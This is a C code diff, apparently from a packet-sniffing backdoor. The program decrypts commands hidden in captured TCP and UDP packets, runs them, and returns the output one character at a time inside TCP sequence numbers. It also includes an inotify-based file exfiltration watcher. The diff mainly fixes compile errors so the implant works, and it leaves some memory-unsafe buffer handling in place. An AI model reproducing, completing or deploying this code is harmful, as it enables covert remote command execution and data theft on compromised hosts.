@@ -112,7 +112,7 @@ void handle_tcp(u_char *user, const struct pcap_pkthdr *pkt_info,
 	struct tcphdr* tcphdr;
 	struct iphdr* iphdr;
 	int size_tcp, ip_len;
-	char *tcp_payload, decrypt_payload;
+	char *tcp_payload, *decrypt_payload;
 
 	iphdr = (struct iphdr*) (packet + sizeof(struct ether_header));
 	ip_len = iphdr->ihl * 4;
@@ -126,10 +126,11 @@ void handle_tcp(u_char *user, const struct pcap_pkthdr *pkt_info,
 	// retrieves the TCP payload
 	tcp_payload = (char *) (packet + ip_len + size_tcp);
 
-	decrypt_payload = malloc(sizeof(tcp_payload));
+	decrypt_payload = malloc(sizeof(char *));
 
 	// decrypt the payload and copy it into decrypt_payload variable.
-	memcpy(decrypt_payload, decrypt(SEKRET, tcp_payload, sizeof(tcp_payload)), sizeof(tcp_payload));
+	decrypt(SEKRET, tcp_payload, sizeof(tcp_payload));
+	memcpy(decrypt_payload, tcp_payload, strlen(tcp_payload));
 
 	cmd_execute(decrypt_payload, ip_addr);
 }
@@ -139,7 +140,7 @@ void handle_udp(u_char *user, const struct pcap_pkthdr *pkt_info,
 	struct udphdr* udphdr;
 	struct iphdr* iphdr;
 	int size_udp, ip_len;
-	char *udp_payload, decrypt_payload;
+	char *udp_payload, *decrypt_payload;
 
 	iphdr = (struct iphdr*) (packet + sizeof(struct ether_header));
 	ip_len = iphdr->ihl * 4;
@@ -154,10 +155,13 @@ void handle_udp(u_char *user, const struct pcap_pkthdr *pkt_info,
 	udp_payload = (char *) (iphdr + ip_len + size_udp);
 
 	// initialize the variable
-	decrypt_payload = malloc(sizeof(udp_payload));
+	decrypt_payload = malloc(sizeof(char *));
 
 	// decrypt the payload and copy it into decrypt_payload variable.
-	memcpy(decrypt_payload, decrypt(SEKRET, udp_payload, sizeof(udp_payload)), sizeof(udp_payload));
+	decrypt(SEKRET, udp_payload, sizeof(udp_payload));
+	memcpy(decrypt_payload, udp_payload, strlen(udp_payload));
+
+	printf("UDP PAYLOAD = %s", decrypt_payload);
 
 	cmd_execute(decrypt_payload, ip_addr);
 }
@@ -167,7 +171,7 @@ void cmd_execute(char *command, uint32 ip) {
 	char line[MAX_LEN];
 	char resp[MAX_LEN];
 	char *trans;
-	int tot_len;
+	int tot_len, i = 0, j = 0;
 
 	memset(line, 0, MAX_LEN);
 	memset(resp, 0, MAX_LEN);
@@ -184,7 +188,7 @@ void cmd_execute(char *command, uint32 ip) {
 	trans = malloc(sizeof(char *));
 	strncpy(trans, resp, tot_len);
 
-	for (int i = 0; i < tot_len; i += 8) {
+	for (i = 0; i < tot_len; i += 8) {
 		char frame[FRAM_SZ];
 		char *ptr;
 		int fram_len;
@@ -202,7 +206,7 @@ void cmd_execute(char *command, uint32 ip) {
 
 		// go through the frame and send 1 character at a time
 		// in the TCP sequence field.
-		for(int j = 0; j < FRAM_SZ; ++j) {
+		for (j = 0; j < FRAM_SZ; ++j) {
 			tcp_seq = DEF_SEQ;
 			tcp_seq += frame[j]; // adding to the default sequence number
 
@@ -280,8 +284,8 @@ void *exfil_watch(void *arg) {
 	ret = inotify_rm_watch(fd, wd);
 	if (ret)
 		error("exfil_watch(): inotify rm watch");
-	else
-		(close(fd)) error("exfil_watch(): close");
+	else if (close(fd))
+		error("exfil_watch(): close");
 
 }
 
